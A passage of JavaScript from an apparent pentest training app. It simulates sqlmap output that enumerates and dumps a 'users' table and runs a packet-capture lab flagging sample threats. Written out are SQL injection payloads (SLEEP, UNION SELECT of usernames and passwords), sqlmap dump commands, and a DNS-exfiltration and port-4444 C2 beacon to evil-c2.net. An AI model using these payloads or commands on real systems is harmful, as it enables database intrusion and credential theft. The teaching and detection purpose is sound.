    outputEl.innerHTML += `<span style="color:#fb923c;">Usage:</span> sqlmap [options]\n\n<span style="color:#fb923c;">Target:</span>\n  -u URL             Target URL (e.g. http://site.com/page?id=1)\n  -r FILE            Load HTTP request from file\n\n<span style="color:#fb923c;">Detection:</span>\n  --level=LEVEL      Detection level (1-5, default: 1)\n  --risk=RISK        Risk of tests (1-3, default: 1)\n\n<span style="color:#fb923c;">Techniques:</span>\n  --technique=TECH   SQL injection techniques (B/E/U/S/T/Q)\n                     B=Boolean, E=Error, U=Union, T=Time\n\n<span style="color:#fb923c;">Enumeration:</span>\n  --dbs              Enumerate DBMS databases\n  --tables           Enumerate tables\n  --columns          Enumerate columns\n  --dump             Dump table entries\n  -D DB              DBMS database to enumerate\n  -T TBL             Table to enumerate\n\n<span style="color:#fb923c;">Fingerprint:</span>\n  -b, --banner       Retrieve DBMS banner\n  --current-user     Retrieve current DB user\n  --current-db       Retrieve current DB\n\n<span style="color:#fb923c;">Examples:</span>\n  sqlmap -u "http://target.com/item?id=1" --dbs\n  sqlmap -u "http://target.com/item?id=1" -D shopdb --tables\n  sqlmap -u "http://target.com/item?id=1" -D shopdb -T users --dump\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  if (!cmd.startsWith('sqlmap')) {
    outputEl.innerHTML += `<span style="color:var(--danger);">Command not found. Type 'sqlmap --help' for usage.</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const hasUrl = /-u\s+["']?https?:\/\//i.test(cmd);
  if (!hasUrl && !cmd.includes('-r ')) {
    outputEl.innerHTML += `<span style="color:var(--danger);">No target URL specified. Use: sqlmap -u "http://target.com/page?id=1"</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const urlMatch = cmd.match(/-u\s+["']?(https?:\/\/[^\s"']+)["']?/i);
  const targetUrl = urlMatch ? urlMatch[1] : 'http://target.com/vuln?id=1';
  const targetHost = escapeHtml(targetUrl.split('/')[2] || 'target.com');
  const hasDbs = cmd.includes('--dbs');
  const hasTables = cmd.includes('--tables');
  const hasDump = cmd.includes('--dump');
  const hasColumns = cmd.includes('--columns');
  const hasBanner = cmd.includes('-b') || cmd.includes('--banner');
  const hasCurrentUser = cmd.includes('--current-user');
  const hasCurrentDb = cmd.includes('--current-db');
  const dbFlag = cmd.match(/-D\s+(\S+)/)?.[1] ? escapeHtml(cmd.match(/-D\s+(\S+)/)[1]) : undefined;
  const tblFlag = cmd.match(/-T\s+(\S+)/)?.[1] ? escapeHtml(cmd.match(/-T\s+(\S+)/)[1]) : undefined;
  const level = cmd.match(/--level=(\d)/)?.[1] || '1';
  const risk = cmd.match(/--risk=(\d)/)?.[1] || '1';

  outputEl.innerHTML += `<span style="color:var(--text-muted);">        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.12#stable}</span>\n`;
  outputEl.innerHTML += `[*] starting @ ${new Date().toLocaleTimeString()}\n`;
  outputEl.innerHTML += `[*] testing connection to target URL...\n`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  const delay = hasDump ? 2200 : hasTables ? 1800 : 1400;
  outputEl.innerHTML += `<span id="sqlmapLoading" style="color:var(--text-muted);">testing...</span>`;

  setTimeout(() => {
    const loading = document.getElementById('sqlmapLoading');
    if (loading) loading.remove();

    outputEl.innerHTML += `[*] testing if the target URL content is stable... <span style="color:var(--success);">yes</span>\n`;
    outputEl.innerHTML += `[*] testing if GET parameter 'id' is dynamic... <span style="color:var(--success);">yes</span>\n`;
    outputEl.innerHTML += `[*] heuristic (basic) test shows that GET parameter 'id' might be injectable\n`;
    outputEl.innerHTML += `[*] testing for SQL injection on GET parameter 'id'\n`;
    outputEl.innerHTML += `[*] testing 'AND boolean-based blind - WHERE or HAVING clause'\n`;
    outputEl.innerHTML += `[*] GET parameter 'id' appears to be <span style="color:var(--success);">Boolean-based injectable</span>\n`;
    outputEl.innerHTML += `[*] testing 'MySQL >= 5.0.12 AND time-based blind'\n`;
    outputEl.innerHTML += `[*] GET parameter 'id' appears to be <span style="color:var(--success);">Time-based injectable (stacked queries)</span>\n`;
    outputEl.innerHTML += `[*] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n`;
    outputEl.innerHTML += `[*] automatically extending ranges for UNION query injection technique\n`;
    outputEl.innerHTML += `[*] <span style="color:var(--success);">target URL appears to be UNION injectable with 3 columns</span>\n\n`;
    outputEl.innerHTML += `<span style="color:var(--success);">sqlmap identified the following injection point(s):</span>\n`;
    outputEl.innerHTML += `---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 1871=1871\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=NULL UNION ALL SELECT NULL,CONCAT(0x7162717071,...),NULL--\n---\n`;

    const dbms = 'MySQL >= 5.0 (MariaDB fork)';
    outputEl.innerHTML += `[*] the back-end DBMS is <span style="color:#fb923c;">${dbms}</span>\n`;

    if (hasBanner) outputEl.innerHTML += `[*] fetching banner\nbanner: '5.7.40-0ubuntu0.22.04.1'\n`;
    if (hasCurrentUser) outputEl.innerHTML += `[*] fetching current user\ncurrent user: 'webapp@localhost'\n`;
    if (hasCurrentDb) outputEl.innerHTML += `[*] fetching current database\ncurrent database: 'shopdb'\n`;

    if (hasDbs) {
      outputEl.innerHTML += `\n[*] fetching database names\n[*] retrieved: 3\navailable databases [3]:\n[*] information_schema\n[*] <span style="color:var(--success);">shopdb</span>\n[*] mysql\n`;
    }
    if (hasTables && dbFlag) {
      outputEl.innerHTML += `\n[*] fetching tables for database: '${dbFlag}'\n[*] retrieved: 4\nDatabase: ${dbFlag}\n[4 tables]\n+----------+\n| users    |\n| products |\n| orders   |\n| sessions |\n+----------+\n`;
    }
    if (hasColumns && dbFlag && tblFlag) {
      outputEl.innerHTML += `\n[*] fetching columns for table '${tblFlag}' in database '${dbFlag}'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[4 columns]\n+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| id       | int(11)      |\n| email    | varchar(200) |\n| password | varchar(300) |\n| role     | varchar(50)  |\n+----------+--------------+\n`;
    }
    if (hasDump && dbFlag && tblFlag) {
      outputEl.innerHTML += `\n[*] fetching entries of column(s) 'email,password,role' for table '${tblFlag}' in database '${dbFlag}'\n[*] recognized possible password hashes in column 'password'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[3 entries]\n+---------+-----------------------------+----------+\n| id      | email                       | role     |\n+---------+-----------------------------+----------+\n| 1       | <span style="color:var(--danger);">admin@company.com</span>           | <span style="color:#fb923c;">admin</span>    |\n| 2       | alice@company.com           | user     |\n| 3       | bob@company.com             | user     |\n+---------+-----------------------------+----------+\n\n<span style="color:var(--success);">table dumped to '/root/.local/share/sqlmap/output/${targetHost}/dump/${dbFlag}/${tblFlag}.csv'</span>\n`;
    }
    if (!hasDbs && !hasTables && !hasDump && !hasColumns && !hasBanner && !hasCurrentUser && !hasCurrentDb) {
      outputEl.innerHTML += `\n[*] <span style="color:#fb923c;">Tip:</span> Vulnerability confirmed! Now enumerate with:\n    --dbs              (list databases)\n    -D shopdb --tables (list tables)\n    -D shopdb -T users --dump  (dump user table)\n`;
    }
    outputEl.innerHTML += `\n[*] ending @ ${new Date().toLocaleTimeString()}\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
  }, delay);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   PACKET LAB SIMULATOR
   ═══════════════════════════════════════════════════════════════════════════════ */

function initPacketLab() {
  const listEl = document.getElementById('packetList');
  const detailEl = document.getElementById('packetDetail');
  const analysisEl = document.getElementById('packetAnalysis');
  const filterInput = document.getElementById('packetFilter');
  const filterBtn = document.getElementById('packetFilterBtn');
  const clearFilterBtn = document.getElementById('packetClearFilter');
  const startBtn = document.getElementById('packetStartCapture');
  if (!listEl) return;

  let packetIndex = 0;
  let captureInterval = null;
  if (window.__packetCaptureInterval) { clearInterval(window.__packetCaptureInterval); window.__packetCaptureInterval = null; }
  let allPackets = [];

  const normalPackets = [
    { proto:'HTTP',  src:'192.168.1.10',   dst:'93.184.216.34', len:341, info:'GET /index.html HTTP/1.1', malicious:false },
    { proto:'DNS',   src:'192.168.1.10',   dst:'8.8.8.8',       len:66,  info:'Standard query A example.com', malicious:false },
    { proto:'TLS',   src:'192.168.1.10',   dst:'172.217.14.206',len:583, info:'Application Data (encrypted)', malicious:false },
    { proto:'HTTP',  src:'192.168.1.105',  dst:'93.184.216.34', len:198, info:'GET /images/logo.png HTTP/1.1', malicious:false },
    { proto:'TCP',   src:'192.168.1.10',   dst:'10.0.0.1',      len:60,  info:'[SYN] Seq=0 Win=65535', malicious:false },
    { proto:'DNS',   src:'192.168.1.15',   dst:'8.8.8.8',       len:74,  info:'Standard query A api.company.com', malicious:false },
    { proto:'HTTP',  src:'192.168.1.22',   dst:'203.0.113.10',  len:420, info:'POST /rest/user/login HTTP/1.1', malicious:false },
    { proto:'ARP',   src:'192.168.1.1',    dst:'ff:ff:ff:ff',   len:42,  info:'Who has 192.168.1.50? Tell 192.168.1.1', malicious:false },
    { proto:'ICMP',  src:'192.168.1.10',   dst:'192.168.1.1',   len:74,  info:'Echo (ping) request id=0x01', malicious:false },
    { proto:'TLS',   src:'192.168.1.33',   dst:'151.101.1.140', len:1452,info:'Application Data', malicious:false },
  ];

  const maliciousPackets = [
    { proto:'DNS',  src:'192.168.1.105', dst:'8.8.8.8',    len:98,  info:'Query A 6d616c776172652d646174612e evil-c2.net (long subdomain!)', malicious:true, detail:'DNS Exfiltration beacon!\nSubdomain encodes base64 data: "malware-data"\nDestination: evil-c2.net (known C2 domain)\nAction: Block outbound DNS to evil-c2.net' },
    { proto:'TCP',  src:'192.168.1.105', dst:'13.37.13.37', len:52, info:'[SYN] → 13.37.13.37:4444 (known RAT port)', malicious:true, detail:'C2 Beacon detected!\nDst Port: 4444 (Metasploit default listener)\nRemote IP: 13.37.13.37 (threat intel: known C2)\nPattern: Repeating every 60s (beacon interval)\nAction: Block outbound TCP/4444, isolate host' },
    { proto:'HTTP', src:'192.168.1.105', dst:'203.0.113.99', len:310, info:'GET /api/users?id=1 UNION SELECT username,password,NULL FROM users--', malicious:true, detail:'SQL Injection in URL!\nPayload: UNION SELECT ...\nTarget endpoint: /api/users\nDatabase data at risk: all user credentials\nAction: WAF block, patch parameterized queries' },
    { proto:'FTP',  src:'192.168.1.20',  dst:'203.0.113.5', len:44,  info:'Request: PASS s3cr3t_p@ssw0rd (PLAINTEXT!)', malicious:true, detail:'Plaintext Credentials Exposed!\nProtocol: FTP (no encryption)\nPassword transmitted in clear text\nAnyone on the network can see this!\nAction: Disable FTP, enforce SFTP/SCP' },
  ];

  function renderPacket(pkt, num, ts) {
    const row = document.createElement('div');
    const color = pkt.malicious ? '#ef4444' : '#a6accd';
    row.style.cssText = `display:grid; grid-template-columns:50px 90px 1fr 1fr 80px 60px; gap:8px; padding:4px 12px; font-family:var(--font-mono); font-size:11px; color:${color}; cursor:pointer; border-bottom:1px solid rgba(255,255,255,0.03);`;
    row.innerHTML = `<span>${num}</span><span>${ts}</span><span>${pkt.src}</span><span>${pkt.dst}</span><span style="color:${pkt.proto==='HTTP'?'#22d3ee':pkt.proto==='DNS'?'#a78bfa':pkt.proto==='TLS'?'#4ade80':color};">${pkt.proto}</span><span>${pkt.len}</span>`;
    row.title = pkt.info;
    row.addEventListener('click', () => {
      listEl.querySelectorAll('div').forEach(r => r.style.background = '');
      row.style.background = pkt.malicious ? 'rgba(239,68,68,0.15)' : 'rgba(34,211,238,0.1)';
      if (detailEl) {
        detailEl.innerHTML = `<span style="color:#22d3ee;">Frame ${num}: ${pkt.len} bytes captured</span>\nTime: ${ts}\nSrc: ${pkt.src}\nDst: ${pkt.dst}\nProtocol: ${pkt.proto}\nInfo: ${escapeHtml(pkt.info)}`;
      }
      if (analysisEl) {
        if (pkt.malicious) {
          analysisEl.style.background = 'rgba(239,68,68,0.08)';
          analysisEl.style.border = '1px solid rgba(239,68,68,0.4)';
          analysisEl.style.color = '#f87171';
          analysisEl.innerHTML = '<strong>THREAT DETECTED</strong><br><pre style="font-family:var(--font-mono);font-size:10px;color:#f87171;white-space:pre-wrap;">' + escapeHtml(pkt.detail) + '</pre>';
        } else {
          analysisEl.style.background = '';
          analysisEl.style.border = '1px solid var(--border)';
          analysisEl.style.color = 'var(--text-secondary)';
          analysisEl.innerHTML = '<strong>Benign traffic</strong> — No indicators of compromise detected in this packet.';
        }
      }
    });
    return row;
  }

  function getFilter() { return filterInput ? filterInput.value.trim().toLowerCase() : ''; }

  function matchesFilter(pkt, filter) {
    if (!filter) return true;
    if (/\s+or\s+/.test(filter)) return filter.split(/\s+or\s+/).some(part => matchesFilter(pkt, part.trim()));
    if (/\s+and\s+/.test(filter)) return filter.split(/\s+and\s+/).every(part => matchesFilter(pkt, part.trim()));
    const f = filter;
    if (f === 'http') return pkt.proto === 'HTTP';
    if (f === 'dns') return pkt.proto === 'DNS';
    if (f === 'tcp') return pkt.proto === 'TCP';
    if (f === 'tls' || f === 'ssl') return pkt.proto === 'TLS';
    if (f === 'ftp') return pkt.proto === 'FTP';
    if (f === 'icmp') return pkt.proto === 'ICMP';
    if (f.includes('ip.dst==')) { const ip = f.split('==')[1]; return pkt.dst.includes(ip); }
    if (f.includes('ip.src==')) { const ip = f.split('==')[1]; return pkt.src.includes(ip); }
    if (f.includes('ip.addr==')) { const ip = f.split('==')[1]; return pkt.src.includes(ip) || pkt.dst.includes(ip); }
    if (f.includes('tcp.dstport==')) { const port = f.split('==')[1]; return pkt.info.includes(':' + port); }
    if (f.includes('dns contains')) { const term = f.split('"')[1] || ''; return pkt.proto === 'DNS' && pkt.info.toLowerCase().includes(term); }
    // Generic text match
    return pkt.info.toLowerCase().includes(f) || pkt.proto.toLowerCase().includes(f) || pkt.src.includes(f) || pkt.dst.includes(f);
  }

  function redrawFiltered() {
    const filter = getFilter();
    listEl.innerHTML = '';
    allPackets.forEach((p, i) => {
      if (matchesFilter(p.pkt, filter)) {
        listEl.appendChild(renderPacket(p.pkt, p.num, p.ts));
      }
    });
    listEl.scrollTop = listEl.scrollHeight;
  }

  if (filterBtn) filterBtn.addEventListener('click', redrawFiltered);
  if (filterInput) filterInput.addEventListener('keydown', e => { if (e.key === 'Enter') redrawFiltered(); });
  if (clearFilterBtn) clearFilterBtn.addEventListener('click', () => { if (filterInput) filterInput.value = ''; redrawFiltered(); });

  // Hook up Quick Filters
  document.querySelectorAll('.quick-filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (filterInput) {
        if (filterInput.value.trim() && !filterInput.value.trim().endsWith('or')) {
          filterInput.value = filterInput.value.trim() + ' or ' + btn.innerText;
        } else {
          filterInput.value = btn.innerText;
        }
        redrawFiltered();
      }
    });
  });

  function addPacket(pkt) {
    packetIndex++;
    const now = new Date();
    const ts = now.toLocaleTimeString('en-US', {hour12:false}) + '.' + String(now.getMilliseconds()).padStart(3,'0');
    allPackets.push({ pkt, num: packetIndex, ts });
    const filter = getFilter();
    if (matchesFilter(pkt, filter)) {
      const row = renderPacket(pkt, packetIndex, ts);
      listEl.appendChild(row);
      listEl.scrollTop = listEl.scrollHeight;
    }
  }

  if (startBtn) startBtn.addEventListener('click', () => {
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
      startBtn.textContent = '▶ Start Capture';
      startBtn.style.background = 'linear-gradient(135deg,#22d3ee,#0ea5e9)';
      return;
    }
    startBtn.textContent = '⏹ Stop Capture';
    startBtn.style.background = 'linear-gradient(135deg,#ef4444,#b91c1c)';
    let tick = 0;
    // Seed with one malicious packet randomly among the first 20
    const maliciousSlots = [5, 11, 16, 18];
    let malIdx = 0;
    captureInterval = window.__packetCaptureInterval = setInterval(() => {
      if (!document.body.contains(listEl)) { clearInterval(captureInterval); captureInterval = null; return; }
      tick++;
      if (maliciousSlots.includes(tick) && malIdx < maliciousPackets.length) {
        addPacket(maliciousPackets[malIdx++]);
      } else {
        addPacket(normalPackets[Math.floor(Math.random() * normalPackets.length)]);
      }
      if (tick >= 40) {
        clearInterval(captureInterval);
        captureInterval = null;
        startBtn.textContent = '▶ Capture Complete (40 packets)';
        startBtn.style.background = 'linear-gradient(135deg,#22d3ee,#0ea5e9)';
      }
    }, 500);
  });
}

function setTheme(theme) {
  document.body.classList.remove('theme-hacker', 'theme-light', 'theme-pink', 'theme-default');
  if (theme !== 'theme-default' && theme !== 'default') {
    document.body.classList.add(theme);
  }
  localStorage.setItem('cybercompanion_theme', theme);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   INTERNATIONALISATION (i18n)  —  English
   ═══════════════════════════════════════════════════════════════════════════════ */

const TRANSLATIONS = {
  en: {
    // Sidebar
    brand_sub: 'Web Pentest Lab Guide',
    nav_modules: 'Modules',
    btn_enter_lab: 'Enter Lab Mode',
    btn_exit_lab: 'Exit Lab Mode',
    btn_settings: 'Settings',
    // Lab Panel
    lab_panel_title: 'Lab Control Panel',
    lab_message: 'Manage your local vulnerable targets',
    btn_boot: 'Boot Lab',
    btn_restart: 'Restart Lab',
    btn_stop: 'Stop Lab',
    btn_refresh: 'Refresh',
    // Welcome hero
    hero_title: 'Welcome to CyberCompanion',
    hero_desc: 'Select a module from the sidebar to begin your Web Application Penetration Testing journey. Boot the lab environment to practice on real vulnerable applications.',
    hero_step1: 'Choose a module',
    hero_step2: 'Boot lab targets',
    hero_step3: 'Follow step-by-step',
    hero_step4: 'Learn to defend',
    // Module section headers
    section_concept: 'Core Concept',
    section_analogy: 'Real-World Analogy',
    section_steps: 'Step-by-Step Lab Exercise',
    section_defense: 'Defense & Remediation',
    section_reference: 'Interactive Reference Table',
    section_challenges: 'Interactive Challenges',
    challenge_intro: 'Put your skills to the test inside the live lab environment. You can follow an interactive step-by-step tutorial, or try to solve it on your own!',
    // Settings modal
    settings_title: 'Global Settings',
    settings_theme_label: 'Application Theme',
    theme_default: 'Default (Dark)',
    theme_hacker: 'Hacker Green',
    theme_light: 'Light Mode',
    theme_pink: 'Neon Pink',
    settings_reset_title: 'Factory Reset',
    settings_reset_desc: 'This will permanently erase all XP, achievements, and unlocked challenges. It will also destroy and rebuild the Juice Shop Docker container.',
    settings_reset_btn: 'Wipe Everything',
    confirm_wipe: 'Are you absolutely sure you want to wipe everything?',
    // Module titles (sidebar)
    mod_burp: 'Burp Suite Proxy Interception',
    mod_sqli: 'SQL Injection (SQLi)',
    mod_sqlmap: 'SQLmap Automation',
    mod_nmap: 'Nmap Network Scanning',
    mod_hydra: 'Hydra Brute-Force',
    mod_xss: 'Cross-Site Scripting (XSS)',
    mod_soc: 'SOC Analyst Simulator',
    mod_net: 'Network Traffic Analyst',
    // SOC section
    soc_title: 'Security Operations Center',
    soc_badge: 'ACTIVE AUDIT',
    soc_mission: 'Mission Objective',
    soc_ioc_title: 'Indicators of Compromise (IoCs)',
    soc_remediation_title: 'Remediation Action Required',
    soc_locked: 'Flag a valid threat to unlock Remediation',
    soc_intel_placeholder: 'Select a log entry to analyze IP reputation and threat score.',
    soc_intel_title: 'Threat Intel Feed',
    soc_waf_status: 'WAF Status: Active',
    soc_threats_mitigated: '0 Threats Mitigated',
    soc_scenario_random: 'Random Attack (Recommended)',
    soc_scenario_sqli: 'SQL Injection',
    soc_scenario_xss: 'XSS Attack',
    soc_scenario_brute: 'Brute Force',
    soc_scenario_path: 'Path Traversal',
    soc_scenario_cmdi: 'Command Injection',
    soc_scenario_idor: 'IDOR (Broken Access Control)',
    soc_scenario_ssrf: 'Server-Side Request Forgery',
    soc_action_waf: 'Update WAF Signatures',
    soc_action_rate: 'Rate Limit IP / Subnet',
    soc_action_isolate: 'Isolate Host from Network',
    soc_action_reset: 'Force Password Reset',
    // Overlay
    overlay_lab_dashboard: 'Lab Dashboard',
    overlay_progress: 'Progress',
    overlay_proxy: 'Mini Proxy',
    overlay_level: 'Current Level',
    overlay_challenges: 'Challenges',
    overlay_total_xp: 'Total XP',
    overlay_module_mastery: 'Module Mastery',
    overlay_recent: 'Recent Activity',
    overlay_loading: 'Loading Juice Shop...',
    // Proxy panel
    proxy_raw: 'Raw HTTP Request',
    proxy_forward: 'Forward',
    proxy_drop: 'Drop',
    proxy_intercept_on: 'Intercept ON',
  }
};

window.__i18n = TRANSLATIONS.en;

function t(key) {
  return TRANSLATIONS.en[key] || key;
}

function initTheme() {
  const savedTheme = localStorage.getItem('cybercompanion_theme');
  if (savedTheme) {
    const select = document.getElementById('themeSelect');
    if (select) select.value = savedTheme;
    setTheme(savedTheme);
  }
}

async function factoryReset() {
  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  localStorage.clear();
  const btn = document.querySelector('.btn-danger-outline');
  if (btn) {
    btn.textContent = "Wiping Database & Restarting Container...";
    btn.disabled = true;
  }
  try {
    if (window.labAPI.clearLabSession) await window.labAPI.clearLabSession();
    await window.labAPI.bootLab();
  } catch (e) {
    console.error('Reset error:', e);
  }
  window.location.reload();
}

// Init theme on load
document.addEventListener('DOMContentLoaded', () => {
  initTheme();
});

/* ═══════════════════════════════════════════════════════════════════════════════
   EXPOSE & INITIALIZE
   ═══════════════════════════════════════════════════════════════════════════════ */

window.__app = {
  handleBoot,
  handleStop,
  handleRestart,
  handleRefresh,
  downloadDocker,
  recheckDocker,
  toggleLabMode,
  toggleOverlayPanel,
  switchOverlayTab: (tabId) => {
    // Switch active tabs
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
    
    if (tabId === 'mission') {
      document.getElementById('tabMission').classList.add('active');
      document.getElementById('tabMission').style.color = 'var(--cyan)';
      document.getElementById('tabMission').style.borderBottom = '2px solid var(--cyan)';
      document.getElementById('tabProxy').style.color = 'var(--text-secondary)';
      document.getElementById('tabProxy').style.borderBottom = '2px solid transparent';
      document.getElementById('overlayContent').style.display = 'block';
    } else {
      document.getElementById('tabProxy').classList.add('active');
      document.getElementById('tabProxy').style.color = 'var(--cyan)';
      document.getElementById('tabProxy').style.borderBottom = '2px solid var(--cyan)';
      document.getElementById('tabMission').style.color = 'var(--text-secondary)';
      document.getElementById('tabMission').style.borderBottom = '2px solid transparent';
      document.getElementById('proxyContent').style.display = 'flex';
    }
  },
  formatProxyJson: () => {
    try {
      const rawRequest = burpEditor.value.replace(/\r\n/g, '\n');
      const parts = rawRequest.split('\n\n');
      if (parts.length >= 2) {
        const headerSection = parts[0];
        const bodySection = parts.slice(1).join('\n\n');
        if (!bodySection.trim()) return;
        const parsedJson = JSON.parse(bodySection);
        const prettyJson = JSON.stringify(parsedJson, null, 2);
        burpEditor.value = headerSection + '\n\n' + prettyJson;
      }
    } catch (e) {
      console.warn("Could not format JSON body", e);
    }
  },
  startTutorial,
  startChallenge,
  startSocSimulator,
  resumeSocSimulator,
  stopSocSimulator,
  exitSoc,
  selectModuleById,
  isLabMode: () => isLabMode,
  submitRemediation,
  toggleSettings,
  toggleSidebar,
  setTheme,
  factoryReset,
  handleNmapCommand,
  handleHydraCommand,
  handleSqlmapCommand,
  initPacketLab,
  triggerBurpSimIntercept: (id, reqStr) => {
    isBurpSimulatorActive = true;
    currentProxyId = id;
    
    if (overlayPanelCollapsed) {
      window.__app.toggleOverlayPanel();
    }
    window.__app.switchOverlayTab('proxy');
    
    if (!isProxyOn) {
      document.getElementById('btnBurpToggle').click();
    }
    
    const editor = document.getElementById('burpPayloadEditor');
    if (editor) {
      editor.value = reqStr;
    }
  }
};

window.TUTORIALS = {};
window.labAPI.getTutorials().then(data => {
  window.TUTORIALS = data || {};

  // Refresh only if a module is actually open (activeModuleIndex starts at -1).
  if (activeModuleIndex >= 0 && activeModuleIndex < MODULES.length) {
    selectModule(activeModuleIndex);
  }
}).catch(err => console.error("Failed to load tutorials via IPC:", err));

buildSidebar();
checkDockerInstallation();

